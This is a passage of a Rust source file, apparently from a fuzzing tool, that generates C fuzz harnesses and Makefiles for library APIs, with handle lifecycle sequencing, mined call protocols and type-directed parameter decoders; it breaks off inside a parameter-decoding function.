// SPDX-License-Identifier: Apache-2.0

use crate::c_decoders::{
    select_c_decoder_with_lifecycle_strict_with_limits,
    select_c_decoder_with_lifecycle_with_limits, CParamEmission,
};
pub use crate::c_decoders::{CHandleLifecycle, DecoderLimits};
use crate::templates;
use crate::HarnessGenError;
use c_parser::CFunction;
use serde::Serialize;
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};
use type_model::{ScalarKind, TypeRegistry, TypeShape};

const BUILD_CONTEXT_COMPILER_PREFIX: &str = "@govfuzz-build-context-compiler=";
const BUILD_CONTEXT_PROVENANCE_PREFIX: &str = "@govfuzz-build-context-provenance=";
const BUILD_CONTEXT_DROPPED_PREFIX: &str = "@govfuzz-build-context-dropped=";

/// Parameter metadata captured from the C source for harness emission.
#[derive(Debug, Clone)]
pub struct CParameter {
    pub name: String,
    pub c_type: String,
}

#[derive(Debug, Clone)]
pub struct GenerateCDirectArgs {
    pub harness_id: String,
    pub output_dir: PathBuf,
    pub source_path: PathBuf,
    pub target: CFunction,
    pub params: Vec<CParameter>,
    pub return_type: String,
    pub target_includes: Vec<String>,
    pub target_includes_dirs: Vec<PathBuf>,
    pub target_sources: Vec<PathBuf>,
    pub compile_flags: Vec<String>,
    pub target_declared_in_header: bool,
    pub c_runtime_include: PathBuf,
    pub type_defs: Vec<c_parser::CTypeDefs>,
    /// Optional cleanup statement emitted right after the target call,
    /// before the per-parameter `free`s. Used to release the function's
    /// return value (e.g. `cJSON_Delete(R)` for cJSON, `XML_Free(R)` for
    /// expat-style APIs). Empty by default; CLI heuristics populate when
    /// the return type matches a known allocator pattern.
    pub result_cleanup: Option<String>,
    /// Init/delete pairs for opaque handle types referenced by the target's
    /// parameters, discovered among sibling functions. Lets an opaque
    /// struct-pointer parameter be constructed via its lifecycle functions
    /// instead of being rejected. Empty by default.
    pub lifecycle: Vec<CHandleLifecycle>,
    /// Optional "drive loop" for a constructor target that RETURNS an opaque
    /// handle built from the fuzz bytes (e.g.
    /// `plm_t *plm_create_with_memory(uint8_t *, size_t, int)`). Without it the
    /// direct harness only calls the constructor and never exercises the
    /// decode/read state machine the bug lives in; with it, the harness pumps
    /// the discovered single-argument handle functions after construction, then
    /// destroys the handle. `None` keeps the plain create-only harness.
    pub drive_plan: Option<CDrivePlan>,
    /// Configurable struct/array decoder caps (§27.11). `Default` reproduces the
    /// historical hardcoded behavior; the CLI threads `--max-decode-depth` /
    /// `--max-array-elems` / `--max-decl-bytes` here.
    pub decoder_limits: DecoderLimits,
    /// Force-fuzz mode (`auto --force`). When true, a parameter the type-directed
    /// decoders reject is given a best-effort compiling driver
    /// ([`crate::c_decoders::best_effort_param_emission`]) instead of failing the
    /// whole target as `unsupported_params`. Default `false` leaves the emission
    /// byte-for-byte unchanged.
    pub force: bool,
}

/// A constructor drive-loop plan: after `H *R = create(Data, Size, …)`, pump
/// each step in a bounded loop, then destroy. Populated by CLI detection only
/// when the target returns an opaque handle and single-argument
/// handle-consuming pump + destroy siblings exist.
#[derive(Debug, Clone)]
pub struct CDrivePlan {
    pub steps: Vec<CDriveStep>,
    /// Single-argument teardown call (`plm_destroy`), folded into the drive
    /// block so the handle is freed under the same `if (R)` guard.
    pub destroy: Option<String>,
}

/// One pump call in a [`CDrivePlan`]. `breaks_on_null` is true when the pump
/// returns a pointer — NULL then signals end-of-stream so the loop stops early
/// rather than spinning to the iteration cap.
#[derive(Debug, Clone)]
pub struct CDriveStep {
    pub name: String,
    pub breaks_on_null: bool,
}

/// Upper bound on operations driven in one execution, and therefore the size of
/// the op program: the control region is one count byte plus one selector slot
/// per possible step. Kept small so the reserved tail stays a negligible slice
/// of a typical input while still allowing a sequence long enough to reach
/// close/reopen cycles.
const MAX_SEQUENCE_STEPS: usize = 8;

#[derive(Debug, Clone)]
pub struct CLifecycleStep {
    pub name: String,
    pub params: Vec<CParameter>,
    pub return_type: String,
    /// What this op does to the handle's LIFETIME. Ops that open or close the
    /// handle used to be filtered out of the alphabet entirely, which made
    /// close/reopen and re-init-over-live-state unreachable by construction —
    /// two of the highest-yield stateful bug classes.
    pub role: CStepRole,
}

/// How an argument observed in project-owned protocol code is reproduced.
/// Only literals and the canonical fuzz input mappings bypass the normal typed
/// decoder. Everything else remains decoded, so mining can improve call order
/// without trusting arbitrary test-local expressions.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CProtocolArg {
    Decode,
    InputData,
    /// A bounded suffix of the canonical input (`data + N`, `&data[N]`).
    InputDataOffset(usize),
    InputSize,
    /// The remaining length paired with [`Self::InputDataOffset`].
    InputSizeMinus(usize),
    /// A stable fractional length such as `size / 2` used by streaming tests.
    InputSizeDivisor(u64),
    /// One byte consumed as a scalar option/flag, optionally masked.
    InputByte {
        index: usize,
        mask: Option<u64>,
    },
    Receiver,
    /// Result of an earlier declaration-checked call in this protocol.
    PriorResult(usize),
    Literal(String),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CProtocolComparison {
    Equal,
    NotEqual,
    Less,
    LessEqual,
    Greater,
    GreaterEqual,
}

/// A bounded control dependency on an earlier call in the same mined trace.
/// `producer_step` is an index into `GenerateCSequenceArgs::protocol_steps`.
/// Codegen verifies that the producer has an observable result before emitting
/// the comparison and independently validates `value`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CProtocolCondition {
    pub producer_step: usize,
    /// Optional public bit mask applied to the earlier result before comparing.
    pub bitmask: Option<String>,
    pub comparison: CProtocolComparison,
    pub value: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CProtocolInputSource {
    Size,
    Byte(usize),
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CProtocolInputTransform {
    Identity,
    Modulo(u64),
    BitAnd(u64),
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CProtocolInputCondition {
    pub source: CProtocolInputSource,
    pub transform: CProtocolInputTransform,
    pub comparison: CProtocolComparison,
    pub value: String,
}

/// One call in a mined expert protocol. `step.params` excludes the receiver,
/// exactly like an ordinary [`CLifecycleStep`]; `args` is position-aligned with
/// those remaining parameters.
#[derive(Debug, Clone)]
pub struct CProtocolStep {
    pub step: CLifecycleStep,
    pub args: Vec<CProtocolArg>,
    /// Whether codegen prepends the lifecycle object before `args`. Dependent
    /// helpers such as `XML_ErrorString(XML_GetErrorCode(parser))` have no
    /// direct handle receiver and carry their complete parameter list in args.
    pub has_receiver: bool,
    pub marks_target: bool,
    pub condition: Option<CProtocolCondition>,
    pub input_condition: Option<CProtocolInputCondition>,
}

/// An additional handle construction observed in a maintained fuzz target.
/// `constructor.params` excludes the parent receiver when
/// `uses_primary_as_parent` is true; otherwise it contains the complete
/// constructor parameter list.
#[derive(Debug, Clone)]
pub struct CProtocolObject {
    pub constructor: CLifecycleStep,
    pub args: Vec<CProtocolArg>,
    pub uses_primary_as_parent: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct CHandleFieldInitializer {
    pub field: String,
    pub value: String,
}

#[derive(Debug, Clone)]
pub struct COutputDrainProtocol {
    /// Parameter index after the lifecycle receiver.
    pub output_argument: usize,
    pub cleanup_name: String,
    pub cleanup_param_type: String,
    pub terminal_field: String,
    pub terminal_value: String,
    /// True for boolean APIs (`nonzero == success`), false for errno/status APIs.
    pub success_nonzero: bool,
}

#[derive(Debug, Clone)]
pub struct CCallbackAction {
    pub step: CLifecycleStep,
    /// Additional public transitions observed in the same registered callback.
    /// The callback trampoline chooses among them from the current input.
    pub alternative_steps: Vec<CLifecycleStep>,
    pub configuration_name: String,
    pub configuration_arg: usize,
}

/// An op's effect on handle liveness.
///
/// Liveness is tracked so the generated sequence can CYCLE the handle
/// (close then reopen, the shape leveldb's own fuzzer spells as `kReopenDb`)
/// without ever driving use-after-close. Calling an ordinary op on a closed
/// handle is API misuse: the target is entitled to crash, so a crash there
/// would be manufactured by the harness rather than found in the library.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum CStepRole {
    /// Ordinary operation; legal only while the handle is live.
    #[default]
    Operation,
    /// Opens/initialises the handle; legal only while it is NOT live.
    Open,
    /// Closes/releases the handle; legal only while it is live.
    Close,
    /// Configures an already-constructed handle: registers a callback, enables a
    /// format, sets an option. Run once unconditionally after construction, and
    /// still available in the loop so the sequence can re-configure.
    Configure,
}

#[derive(Debug, Clone)]
pub struct GenerateCSequenceArgs {
    pub harness_id: String,
    pub output_dir: PathBuf,
    pub source_path: PathBuf,
    pub target: CFunction,
    /// C type stored in `_gf_handle`. For an in-place lifecycle this is the
    /// complete aggregate (`struct session`); for a returning lifecycle it is
    /// the public pointer/opaque-handle spelling (`struct archive *`,
    /// `XML_Parser`).
    pub handle_type: String,
    /// Exact type of the receiver parameter accepted by every operation.
    /// Keeping this separate from `handle_type` lets a returning constructor
    /// use an opaque pointer typedef without pretending the pointee is complete.
    pub handle_param_type: String,
    /// The constructor returns the live handle instead of initializing caller
    /// storage through its first argument.
    pub init_returns_handle: bool,
    /// Parameter receiving the live handle for a status-returning constructor
    /// (`sqlite3_open(path, sqlite3 **)`). Unlike an in-place aggregate init,
    /// the stored handle is itself a pointer value.
    pub init_out_handle_argument: Option<usize>,
    /// Some C initializers use boolean success (nonzero) rather than errno-style
    /// status success (zero). This polarity is mined from maintained call sites.
    pub init_success_nonzero: bool,
    /// Public aggregate fields that maintained examples initialize before the
    /// selected endpoint. Codegen verifies both the field declaration and the
    /// bounded literal/constant grammar before emitting them.
    pub handle_field_initializers: Vec<CHandleFieldInitializer>,
    pub output_drain_protocol: Option<COutputDrainProtocol>,
    pub init_step: Option<CLifecycleStep>,
    pub op_steps: Vec<CLifecycleStep>,
    /// Ordered calls mined from maintained fuzz/tests and checked against the
    /// same-handle declarations selected by the CLI.
    pub protocol_steps: Vec<CProtocolStep>,
    /// Extra independent/derived objects the expert harness constructs and then
    /// drives through the same protocol.
    pub protocol_objects: Vec<CProtocolObject>,
    /// Configuration calls whose maintained recipe passes the live handle back
    /// as user/context data. This is required before a callback-time lifecycle
    /// action can safely recover its owning object.
    pub receiver_configuration_names: Vec<String>,
    /// A public, type-checked state transition observed inside a registered
    /// expert callback (e.g. `XML_StopParser`). Codegen drives it through a
    /// bounded callback hook controlled by the current fuzz input.
    pub callback_action: Option<CCallbackAction>,
    pub end_step: Option<CLifecycleStep>,
    pub target_includes: Vec<String>,
    pub target_includes_dirs: Vec<PathBuf>,
    pub target_sources: Vec<PathBuf>,
    pub compile_flags: Vec<String>,
    pub target_declared_in_header: bool,
    pub c_runtime_include: PathBuf,
    pub type_defs: Vec<c_parser::CTypeDefs>,
    /// See [`GenerateCDirectArgs::decoder_limits`] (§27.11).
    pub decoder_limits: DecoderLimits,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct GeneratedCFiles {
    pub main_c: PathBuf,
    pub makefile: PathBuf,
    pub harness_id: String,
}

pub fn generate_c_direct_harness(
    args: GenerateCDirectArgs,
) -> Result<GeneratedCFiles, HarnessGenError> {
    let context = build_c_context(&args)?;
    let tera = templates::build_tera()?;
    let main_c = tera.render(
        "direct_harness_c",
        &tera::Context::from_serialize(&context)?,
    )?;
    let makefile = tera.render(
        "harness_makefile",
        &tera::Context::from_serialize(&context)?,
    )?;

    fs::create_dir_all(&args.output_dir)?;
    let main_path = args.output_dir.join("main.c");
    let makefile_path = args.output_dir.join("Makefile");
    fs::write(&main_path, main_c)?;
    fs::write(&makefile_path, makefile)?;

    Ok(GeneratedCFiles {
        main_c: main_path,
        makefile: makefile_path,
        harness_id: args.harness_id,
    })
}

/// Sidecar naming the op program's geometry, written next to the generated
/// sequence harness and read by the engine to build an
/// `OperationSequenceLayout` for whatever input it is about to mutate.
pub const SEQUENCE_LAYOUT_FILE: &str = "sequence-layout.json";
pub const PROTOCOL_PORTFOLIO_FILE: &str = "protocol-portfolio.json";

pub fn generate_c_sequence_harness(
    args: GenerateCSequenceArgs,
) -> Result<GeneratedCFiles, HarnessGenError> {
    let context = build_c_sequence_context(&args)?;
    let tera = templates::build_tera()?;
    let main_c = tera.render(
        "sequence_harness_c",
        &tera::Context::from_serialize(&context)?,
    )?;
    let makefile = tera.render(
        "harness_makefile",
        &tera::Context::from_serialize(&context)?,
    )?;

    fs::create_dir_all(&args.output_dir)?;
    let main_path = args.output_dir.join("main.c");
    let makefile_path = args.output_dir.join("Makefile");
    fs::write(&main_path, main_c)?;
    fs::write(&makefile_path, makefile)?;
    // Describe the op program's geometry so the engine can build a
    // structure-aware mutation layout for an input of any length. Without it
    // the sequence mutator has nothing to describe, and every op program is
    // mutated as opaque bytes.
    fs::write(
        args.output_dir.join(SEQUENCE_LAYOUT_FILE),
        format!(
            "{{\n  \"operation_count\": {},\n  \"max_steps\": {},\n  \"control_len\": {},\n  \"portfolio_lanes\": {}\n}}\n",
            context.op_steps.len(),
            context.op_max_steps,
            context.op_ctrl_len,
            context.protocol_portfolio_lanes,
        ),
    )?;
    if context.protocol_portfolio_lanes > 1 {
        let lanes = if context
            .expert_stream_pump
            .as_ref()
            .is_some_and(|pump| pump.skip_step.is_some())
        {
            vec![
                "    {\"lane\": 0, \"rank\": 0, \"recipe\": \"stream_drain\"}".to_owned(),
                "    {\"lane\": 1, \"rank\": 1, \"recipe\": \"stream_skip\"}".to_owned(),
            ]
        } else {
            let mut lanes =
                vec!["    {\"lane\": 0, \"rank\": 0, \"recipe\": \"primary\"}".to_owned()];
            lanes.extend(context.mined_protocol_objects.iter().enumerate().map(
                |(index, object)| {
                    format!(
                        "    {{\"lane\": {}, \"rank\": {}, \"recipe\": \"{}\"}}",
                        index + 1,
                        index + 1,
                        object.constructor.name
                    )
                },
            ));
            lanes
        };
        fs::write(
            args.output_dir.join(PROTOCOL_PORTFOLIO_FILE),
            format!(
                "{{\n  \"strategy\": \"ranked_specialized_protocol_lanes\",\n  \"lanes\": [\n{}\n  ]\n}}\n",
                lanes.join(",\n")
            ),
        )?;
    }

    Ok(GeneratedCFiles {
        main_c: main_path,
        makefile: makefile_path,
        harness_id: args.harness_id,
    })
}

#[derive(Debug, Serialize)]
struct CTemplateContext {
    harness_id: String,
    qualified_target_name: String,
    target_includes: Vec<String>,
    target_includes_dirs: Vec<String>,
    target_sources: Vec<String>,
    compile_flags: Vec<String>,
    build_context_provenance: String,
    build_context_dropped: String,
    c_compiler: String,
    compiler_is_gcc: bool,
    c_runtime_include: String,
    emit_forward_declaration: bool,
    params: Vec<CParamEmission>,
    return_type: String,
    return_type_present: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    result_cleanup: Option<String>,
    passthrough_libfuzzer_entrypoint: bool,
    /// True for a byte-stream decoder: a `parse`/`decode` function whose first
    /// parameter is a single untrusted byte the driver feeds one at a time
    /// (PX4 st24_decode/sumd_decode). The harness feeds the whole fuzz input
    /// through the target byte-by-byte in a loop so the stateful machine is
    /// actually driven — a single call with one fuzzed byte never reaches the
    /// deeper states. `params` then holds only parameters 2..N (the byte is the
    /// loop variable, not decoded from the cursor).
    byte_stream: bool,
    /// Constructor drive-loop pumps emitted after `H *R = create(...)`; empty
    /// for an ordinary direct harness.
    drive_steps: Vec<CDriveStepEmission>,
    /// Single-argument teardown for the drive loop (`plm_destroy`), folded into
    /// the `if (R)` block so a NULL handle is never destroyed.
    #[serde(skip_serializing_if = "Option::is_none")]
    drive_destroy: Option<String>,
    /// Per-pump iteration cap so a malformed stream can't spin forever.
    drive_cap: usize,
}

/// Upper bound on drive-loop pump iterations per input. A pointer-returning
/// pump breaks early on NULL (end-of-stream); this only bounds the pathological
/// case where a mutated stream keeps yielding decodable frames forever. Kept
/// small on purpose: the first handful of frames already exercises the deep
/// decoder (I-frame DCT/IDCT, then inter-frame motion compensation and the
/// reference-frame machinery), and a low cap keeps each input cheap so the
/// fuzzer explores many inputs rather than burning a whole exec decoding one
/// mutated stream's garbage frames. Throughput, not depth, is the scarce
/// resource here.
const DRIVE_LOOP_CAP: usize = 64;

#[derive(Debug, Serialize)]
struct CDriveStepEmission {
    name: String,
    breaks_on_null: bool,
}

#[derive(Debug, Serialize)]
struct CSequenceTemplateContext {
    harness_id: String,
    target_includes: Vec<String>,
    target_includes_dirs: Vec<String>,
    target_sources: Vec<String>,
    compile_flags: Vec<String>,
    build_context_provenance: String,
    build_context_dropped: String,
    c_compiler: String,
    compiler_is_gcc: bool,
    c_runtime_include: String,
    emit_forward_declaration: bool,
    /// Exact public libjpeg decompressor lifecycle. `jpeg_read_header` cannot
    /// be called on a field-by-field synthesized `jpeg_decompress_struct`: the
    /// macro constructor, error manager, source manager, and ordered scanline
    /// drain are all mandatory parts of the API contract.
    expert_jpeg_decompress: bool,
    /// Exact public SQLite prepare/step/finalize lifecycle over an in-memory DB.
    /// Preparing once without stepping/finalizing leaves most of the VM surface
    /// unreachable and leaks every successfully prepared statement.
    expert_sqlite_prepare: bool,
    handle_type: String,
    handle_param_type: String,
    /// Type of a value passed as an operation receiver. This is always pointer-
    /// shaped even when the backing storage is an in-place aggregate.
    handle_value_type: String,
    init_returns_handle: bool,
    init_out_handle: bool,
    handle_is_pointer_value: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    init_step: Option<CSequenceStepEmission>,
    /// Campaign #12: when true, the op-loop and teardown are wrapped in a
    /// `if (init_result == 0)` guard so they run only on a successful constructor.
    guard_op_loop_on_init: bool,
    init_success_nonzero: bool,
    handle_field_initializers: Vec<CHandleFieldInitializer>,
    op_steps: Vec<CSequenceStepEmission>,
    op_step_max: usize,
    /// Upper bound on steps in one execution. Also fixes the size of the
    /// control region: one count byte plus one selector slot per possible step.
    op_max_steps: usize,
    /// Bytes reserved at the END of the input for the op program, so the
    /// argument cursor can be clamped away from them.
    op_ctrl_len: usize,
    /// Typed slots carrying an op's return value to a later op's argument.
    thread_slots: Vec<CThreadSlot>,
    /// True when some op returns a NEW handle derived from the live one, so the
    /// harness keeps a derived slot and can drive ops against it.
    derives_handle: bool,
    /// Configuration calls run once between construction and use.
    configure_steps: Vec<CSequenceStepEmission>,
    /// A deterministic, declaration-checked state-machine trace mined from the
    /// project itself. It replaces random operation permutation when present:
    /// ordering and repeated calls are the protocol (stream then finalize).
    mined_protocol_steps: Vec<CSequenceStepEmission>,
    /// True only when the observed trace ends by restoring the handle to a
    /// reusable initial state. In that case the deterministic expert prefix and
    /// the exploratory random program can safely compose in one iteration.
    mined_protocol_allows_random: bool,
    /// Unique signatures needed for support blocks/forward declarations; the
    /// execution list above deliberately retains repetitions.
    mined_protocol_declarations: Vec<CSequenceStepEmission>,
    mined_protocol_objects: Vec<CProtocolObjectEmission>,
    protocol_portfolio_lanes: usize,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    callback_actions: Vec<CCallbackActionEmission>,
    /// A structurally proven reader pipeline matching the hand-written
    /// libarchive harness: open the memory image, walk every header, and drain
    /// every entry. Randomly permuting these dependent calls reaches far less
    /// parser code because almost every ordering is semantically dead.
    #[serde(skip_serializing_if = "Option::is_none")]
    expert_stream_pump: Option<CExpertStreamPump>,
    /// Evidence-backed pull-parser loop over a non-const output aggregate.
    #[serde(skip_serializing_if = "Option::is_none")]
    expert_output_drain: Option<CExpertOutputDrain>,
    #[serde(skip_serializing_if = "Option::is_none")]
    end_step: Option<CSequenceStepEmission>,
}

#[derive(Debug, Clone, Serialize)]
struct CSequenceStepEmission {
    name: String,
    params: Vec<CParamEmission>,
    return_type: String,
    return_type_present: bool,
    /// Liveness role, so the op loop can gate on it (see [`CStepRole`]).
    role: CStepRole,
    /// Slot this op's return value is stored into, when some other op consumes
    /// that type as an argument.
    produces_slot: Option<String>,
    /// True when this op returns a NEW handle derived from the live one.
    produces_derived_handle: bool,
    /// Expression for the object this op is called ON. `&_gf_handle` unless the
    /// harness has a derived object to choose between.
    receiver: String,
    /// Name of the per-call byte that chooses the receiver, when there is a
    /// choice to make.
    receiver_selector: Option<String>,
    /// True when this step's return is a 0==success status int (#12). Used on the
    /// init step to guard the op-loop + teardown on the constructor succeeding.
    is_status_return: bool,
    result_name: String,
    /// True for every repeated occurrence of the requested endpoint in a mined
    /// protocol, so external drivers still delimit target execution correctly.
    marks_target: bool,
    /// Index of a configuration parameter bound to the current live receiver
    /// (typically a user-data/context pointer). Object-topology calls substitute
    /// their own handle at this position rather than retaining the primary.
    callback_context_arg: Option<usize>,
    /// Safe comparison against a previously declared protocol result.
    #[serde(skip_serializing_if = "Option::is_none")]
    condition: Option<String>,
}

#[derive(Debug, Serialize)]
struct CExpertStreamPump {
    open_step: CSequenceStepEmission,
    header_step: CSequenceStepEmission,
    data_step: CSequenceStepEmission,
    #[serde(skip_serializing_if = "Option::is_none")]
    skip_step: Option<CSequenceStepEmission>,
    data_buffer_name: String,
    data_buffer_bytes: usize,
    entry_cap: usize,
    data_cap: usize,
}

#[derive(Debug, Serialize)]
struct CExpertOutputDrain {
    target_step: CSequenceStepEmission,
    output_value: String,
    output_pointer: String,
    cleanup_name: String,
    cleanup_param_type: String,
    terminal_field: String,
    terminal_value: String,
    success_nonzero: bool,
    iteration_cap: usize,
}

#[derive(Debug, Serialize)]
struct CProtocolObjectEmission {
    handle_name: String,
    constructor: CSequenceStepEmission,
    constructor_uses_parent: bool,
    protocol_steps: Vec<CSequenceStepEmission>,
    #[serde(skip_serializing_if = "Option::is_none")]
    end_step: Option<CSequenceStepEmission>,
}

#[derive(Debug, Serialize)]
struct CCallbackActionEmission {
    name: String,
    handle_param_type: String,
    args: Vec<String>,
}

/// Drop a callback param's leading `typedef …;` line from its support code (the
/// header the harness includes already declares that type). Only the first line
/// — emitted by `build_callback_trampoline` as `typedef …;\n<trampoline def>` —
/// is removed; non-callback support (no leading `typedef `) is returned
/// unchanged. The trampoline definition and the cast assignment keep working
/// because they reference the header's typedef.
fn strip_redundant_callback_typedef(mut param: CParamEmission) -> CParamEmission {
    let stripped = param.support.as_deref().and_then(|support| {
        let rest = support.strip_prefix("typedef ")?;
        let (typedef_line, body) = rest.split_once('\n')?;
        // An INLINE (anonymous) function-pointer param — `void (*cb)(...)`,
        // md4c's `md_html` — has no project typedef behind it: the synthesized
        // `_gf_cb_<name>` typedef is the ONLY declaration of the callback's decl
        // type, and the included header cannot supply it. Dropping it would leave
        // the decl referencing an undeclared `_gf_cb_*` type (failed_build). Only a
        // typedef that re-declares a header-NAMED callback type (inih's `ini_handler`)
        // is the redundant redefinition this strip targets; keep the synthesized one.
        if typedef_line.contains("_gf_cb_") {
            return None;
        }
        Some(body.to_owned())
    });
    if let Some(body) = stripped {
        param.support = Some(body);
    }
    param
}

/// Walk the parameter list and, for adjacent (raw-buffer, length) pairs,
/// emit a coherent pair decoder so both parameters describe the *same* bytes
/// fed by libFuzzer. Real fuzz APIs (cJSON_ParseWithLength, parse(uint8_t*,
/// size_t), ...) require the length to match the buffer; emitting two
/// independent decoders means random length values that don't match the
/// random buffer length, which manifests as spurious heap-buffer-overflow
/// findings.
/// True when a C return type denotes `void`, including when wrapped in an
/// export-visibility macro that expands to its argument (e.g. libyaml's
/// `YAML_DECLARE(void)` -> `void`). Binding such a call in a `<type> R = ...`
/// declaration is illegal ("variable has incomplete type 'void'"), so the
/// result must not be captured.
/// True when a return type is a plain SIGNED-INTEGER status / error code, where the
/// universal C convention is 0 == success and non-zero == failure (microtar's
/// `mtar_open` -> `MTAR_ESUCCESS == 0`). Used to guard a sequence harness's op-loop
/// and teardown on the constructor succeeding (#12). Conservative: only bare
/// signed-int spellings, so a pointer/handle/unsigned/void return is never treated
/// as a 0==success status (where a `!= 0` guard would be wrong).
fn c_type_is_status_int(return_type: &str) -> bool {
    let t = return_type.trim().trim_start_matches("const ").trim();
    matches!(
        t,
        "int"
            | "signed int"
            | "int32_t"
            | "int64_t"
            | "long"
            | "signed long"
            | "long int"
            | "long long"
            | "intmax_t"
            | "ssize_t"
            | "ptrdiff_t"
    )
}

fn c_return_is_void(return_type: &str) -> bool {
    let trimmed = return_type.trim();
    if trimmed == "void" {
        return true;
    }
    // `IDENT(void)` — an export/visibility macro wrapping a void return.
    if let Some(open) = trimmed.find('(') {
        if let Some(inner) = trimmed.strip_suffix(')') {
            let macro_name = trimmed[..open].trim();
            let arg = inner[open + 1..].trim();
            if !macro_name.is_empty()
                && macro_name
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '_')
                && arg == "void"
            {
                return true;
            }
        }
    }
    false
}

/// The struct/union spellings whose FULL definition is visible to the harness
/// translation unit, derived from the harness's type defs (which, for a non-static
/// target, are the INCLUDED headers + the tree-wide flat-POD fallback — never the
/// target `.c`'s own body). A handle whose struct is merely forward-declared in the
/// headers and fully defined only in a non-included `.c` (tidwall/hashmap.c's
/// `struct hashmap`) is therefore ABSENT here, so the opaque-handle lifecycle path
/// refuses to stack-allocate it and skips the target instead of emitting an illegal
/// incomplete-type declaration (GAP #6). The spellings match the resolver's opaque
/// `raw` form (`struct X` / `union X`, plus the bare tag for typedef'd aggregates).
fn header_complete_aggregate_spellings(type_defs: &[c_parser::CTypeDefs]) -> HashSet<String> {
    let mut set = HashSet::new();
    for defs in type_defs {
        for s in defs.structs.iter().filter(|s| s.complete) {
            set.insert(format!("struct {}", s.name));
            set.insert(format!("union {}", s.name));
            set.insert(s.name.clone());
        }
    }
    set
}

#[allow(clippy::too_many_arguments)]
fn build_param_decoders(
    params: &[CParameter],
    registry: &TypeRegistry,
    lifecycle: &[CHandleLifecycle],
    header_complete: Option<&HashSet<String>>,
    nul_terminate_input_buffers: bool,
    variadic: bool,
    limits: DecoderLimits,
    // Enclosing function name (#25): when it is a file LOADER (load_file/read_file/
    // parse_file/...), a `path`/`path_`/`source`/`uri` string param is a filesystem
    // PATH whose CONTENT is the fuzz input (driven via a tempfile), not an in-band
    // string — otherwise the loader ENOENTs and the parser never runs.
    function_name: &str,
    // Force-fuzz mode (`auto --force`). When true, a parameter the type-directed
    // decoders REJECT gets a best-effort compiling driver instead of erroring the
    // whole target out as `unsupported_params`. Default-path callers pass `false`,
    // so their emission is byte-for-byte unchanged.
    force: bool,
) -> Result<Vec<CParamEmission>, HarnessGenError> {
    // Normalise parameter names to bare identifiers (a mis-split top-level
    // pointer cv-qualifier `const T * const name` parsed as name = "const name"
    // would emit an illegal `func(const name)`), and strip parameter-attribute
    // decoration macros from the type (`XXH_NOESCAPE XXH3_state_t *`) so they do
    // not pollute type resolution and turn a real type into an opaque skip.
    let params: Vec<CParameter> = params
        .iter()
        .enumerate()
        .map(|(i, p)| {
            // Defensive: a function-pointer param whose declarator leaked into the
            // name (`(*cb)(args)` with c_type collapsed to the bare return type)
            // is rebuilt into the canonical funcptr model so it routes through the
            // trampoline decoder rather than the broken buffer-init splice.
            if let Some((fname, ftype)) =
                crate::c_decoders::recover_leaked_funcptr_param(&p.name, &p.c_type)
            {
                return CParameter {
                    name: fname,
                    c_type: ftype,
                };
            }
            CParameter {
                name: crate::c_decoders::sanitize_or_synthesize_param_name(&p.name, i),
                c_type: crate::c_decoders::strip_type_decoration(&p.c_type),
            }
        })
        .collect();
    let params = &params[..];
    let mut out = Vec::with_capacity(params.len());
    let mut i = 0;
    // A function that takes an untrusted (raw byte buffer, length) pair is a
    // parser; its other non-const struct-pointer params are outputs the parser
    // fills, not fuzz inputs. Detect the pair once up front so those out-params
    // get a zeroed scratch instead of starving the buffer with field synthesis.
    let has_raw_buffer_pair = (0..params.len().saturating_sub(1)).any(|j| {
        is_raw_buffer_param(&params[j].c_type, registry)
            && (is_length_param(&params[j + 1].c_type)
                || (registry_resolves_to_length(&params[j + 1].c_type, registry)
                    && looks_like_count_name(&params[j + 1].name)))
    });
    // Campaign #9: a raw byte buffer anywhere in the signature means an unpaired
    // integer in/out pointer is, in practice, an index/cursor the callee uses to
    // walk that buffer (qoi_read_32's `int *p` -> `bytes[(*p)++]`). Fuzzing it
    // full-range against the Size-bounded buffer is a guaranteed heap-OOB on
    // short/0-byte input. Pin such an index to 0 (the caller's seed) instead.
    let has_byte_buffer = params
        .iter()
        .any(|p| is_raw_buffer_param(&p.c_type, registry));
    // Apply pair detection only once per harness: the libFuzzer Data span is
    // consumed by the first matched pair, so a second `(const char *, int)`
    // (e.g. xmlReadMemory's `encoding` + `options`) needs the standalone
    // decoders. Without this, repeated pairs share Data and Size which
    // produces obviously-wrong harnesses.
    let mut pair_consumed = false;
    while i < params.len() {
        // libarchive documents this as an I/O buffer size, not semantic input.
        // Experts use a stable non-zero block (commonly 10 KiB); fuzzing zero or
        // tiny values makes valid file-backed seeds fail in setup and spends
        // mutation energy on buffering rather than archive structure.
        if is_exact_libarchive_file_reader_open(function_name)
            && params[i].name.to_ascii_lowercase().contains("block_size")
            && (is_length_param(&params[i].c_type)
                || registry_resolves_to_length(&params[i].c_type, registry))
        {
            let ty = emit_c_type(&params[i].c_type);
            out.push(CParamEmission {
                support: None,
                decl: format!("{ty} {} = ({ty})10240", params[i].name),
                arg: params[i].name.clone(),
                c_type: ty,
                free: None,
            });
            i += 1;
            continue;
        }
        // Streaming decoders commonly expose an in/out count followed by an
        // in/out byte cursor (`size_t *available_in, const uint8_t **next_in` and
        // `size_t *available_out, uint8_t **next_out`). The count and storage
        // must be emitted together: fuzzing the count independently from the
        // pointer fabricates an out-of-bounds read/write before target logic is
        // reached. The const cursor borrows Data; the mutable cursor owns a
        // bounded output buffer.
        if i + 1 < params.len()
            && is_length_pointer_param(&params[i].c_type)
            && byte_double_pointer_kind(&params[i + 1].c_type).is_some()
            && looks_like_stream_count_cursor_pair(&params[i], &params[i + 1])
        {
            let (len_decl, cursor_decl) = pair_stream_count_byte_cursor(&params[i], &params[i + 1]);
            out.push(len_decl);
            out.push(cursor_decl);
            i += 2;
            pair_consumed = true;
            continue;
        }
        // Some public APIs spell the same ownership contracts in the reverse
